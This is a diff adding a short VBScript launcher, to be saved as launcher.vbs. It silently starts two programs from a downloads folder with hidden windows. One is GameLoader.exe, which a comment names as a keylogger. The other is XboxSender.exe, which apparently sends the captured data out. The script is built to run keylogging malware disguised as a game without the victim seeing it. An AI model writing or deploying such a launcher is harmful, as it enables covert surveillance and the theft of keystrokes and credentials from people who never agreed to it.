@@ -1,0 +1,8 @@
+Set WshShell = CreateObject("WScript.Shell")
+
+' Edit the script if necessary to a location where you are launch files from and save as launcher.vbs
+' Run GameLoader(keylogger).exe with a hidden window
+WshShell.Run """C:\DownloadedFiles\GameLoader.exe""", 0, False
+
+' Run Xbox.exe with a hidden window
+WshShell.Run """C:\DownloadedFiles\XboxSender.exe""", 0, False
